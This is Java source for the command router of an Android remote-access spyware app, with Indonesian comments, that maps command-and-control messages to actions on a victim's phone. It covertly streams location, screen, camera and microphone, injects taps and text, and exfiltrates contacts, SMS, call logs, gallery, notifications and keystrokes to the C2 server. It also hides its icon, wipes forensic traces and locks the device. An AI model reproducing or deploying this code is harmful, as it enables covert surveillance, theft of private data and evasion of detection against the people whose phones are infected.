package ai.m4zk1play.spy;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

/** Penerjemah perintah C2 → aksi. */
public class Router {

    private final AgentService svc;
    private final Context ctx;
    private final C2Client client;
    private final MediaModule media;
    private final ScreenModule screen;

    public Router(AgentService svc, C2Client client, MediaModule media, ScreenModule screen) {
        this.svc = svc;
        this.ctx = svc;
        this.client = client;
        this.media = media;
        this.screen = screen;
    }

    public void handle(final String id, final String type, final JSONObject a) {
        new Thread(() -> {
            JSONObject out = new JSONObject();
            boolean ok = true;
            try {
                switch (type) {
                    case "ping": out.put("pong", System.currentTimeMillis()); break;
                    case "info": out = Modules.info(ctx); break;
                    case "locate_once": out = Modules.location(ctx); break;
                    case "locate_start":
                        svc.startLocate();
                        out.put("live", true);
                        break;
                    case "locate_stop":
                        svc.stopLocate();
                        out.put("live", false);
                        break;
                    case "screen_start":
                        if (screen.ready()) out.put("aktif", true);
                        else { svc.needProjection(); ok = false; out.put("info", "izin layar diminta di target"); }
                        break;
                    case "screen_shot": screen.shot(ctx); break;
                    case "screen_stop": screen.stop(); break;
                    case "tap": screen.tap(a.optInt("x"), a.optInt("y")); break;
                    case "swipe":
                        screen.swipe(a.optInt("x1"), a.optInt("y1"), a.optInt("x2"), a.optInt("y2"));
                        break;
                    case "key": key(a.optString("code")); break;
                    case "text": text(a.optString("text")); break;
                    case "cam_front": media.camera(ctx, true); break;
                    case "cam_back": media.camera(ctx, false); break;
                    case "cam_stop": media.stopCamera(); break;
                    case "mic_start": media.mic(true); break;
                    case "mic_stop": media.mic(false); break;
                    case "speaker_play":
                    case "media_push": play(a.optString("url"), a.optString("kind")); break;
                    case "wallpaper_set": Modules.setWallpaper(ctx, a.optString("url")); break;
                    case "volume": Modules.volume(ctx, a.optInt("level", 8)); break;
                    case "brightness": Modules.brightness(ctx, a.optInt("pct", 60)); break;
                    case "vibrate": Modules.vibrate(ctx, a.optLong("ms", 800)); break;
                    case "toast": Modules.toast(ctx, a.optString("text")); break;
                    case "open_url":
                        Intent u = new Intent(Intent.ACTION_VIEW, Uri.parse(a.optString("url")));
                        u.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(u);
                        break;
                    case "lock_screen": Shell.exec("input keyevent 26"); break;
                    case "lock_pin": LockActivity.open(ctx); break;
                    case "dump_contacts": dump("contacts", "contacts", Modules.contacts(ctx)); break;
                    case "dump_sms": dump("sms", "sms", Modules.sms(ctx)); break;
                    case "dump_calls": dump("calls", "calls", Modules.calls(ctx)); break;
                    case "dump_gallery": dump("gallery", "gallery", Modules.gallery(ctx, 400)); break;
                    case "dump_apps": dump("apps", "apps", Modules.apps(ctx)); break;
                    case "dump_notif": dumpRaw("notif", "notif", new JSONArray(NotifListener.drain())); break;
                    case "dump_keylog": dumpRaw("keylog", "keylog", svc.drainKeys()); break;
                    case "dump_net": out = svc.netInfo(); break;
                    case "notif_start":
                        ctx.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                        break;
                    case "notif_stop": out.put("notif", NotifListener.alive()); break;
                    case "keylog_start": out.put("keylog", true); break;
                    case "keylog_stop": out.put("keylog", false); break;
                    case "hide_icon":
                        Modules.hideIcon(ctx, true);
                        if (Build.VERSION.SDK_INT >= 21) out.put("hidden", true);
                        break;
                    case "show_icon": Modules.hideIcon(ctx, false); break;
                    case "forensic_clean": Modules.clean(ctx); break;
                    case "delay_mode": svc.delayMode(); break;
                    case "kill_self": svc.stopSelf(); break;
                    default: ok = false; out.put("info", "perintah tak dikenal"); break;
                }
            } catch (Exception e) {
                ok = false;
                try { out.put("error", e.getMessage()); } catch (Exception ignored) { }
            }
            client.result(id, ok, out);
        }, "mzk-cmd").start();
    }

    private void key(String code) {
        int kc;
        switch (code == null ? "" : code) {
            case "home": kc = 3; break;
            case "back": kc = 4; break;
            case "recents": kc = 187; break;
            case "lock": kc = 26; break;
            case "enter": kc = 66; break;
            default: kc = 3;
        }
        Shell.exec("input keyevent " + kc);
    }

    private void text(String t) {
        if (t == null || t.isEmpty()) return;
        Shell.exec("input text " + t.replace(" ", "%s").replace("'", "\\'"));
    }

    private void play(String url, String kind) {
        if (url == null || url.isEmpty()) return;
        try {
            Intent i = new Intent(ctx, PlayerActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("url", url);
            i.putExtra("kind", kind);
            ctx.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    private void dump(String kind, String base, JSONArray arr) {
        if (client != null) {
            client.dump(kind, base + "_" + Modules.stamp() + ".json", Modules.base64(arr.toString().getBytes()));
        }
    }

    private void dumpRaw(String kind, String base, JSONArray arr) {
        if (client != null) {
            client.dump(kind, base + "_" + Modules.stamp() + ".json", Modules.base64(arr.toString().getBytes()));
        }
    }
}
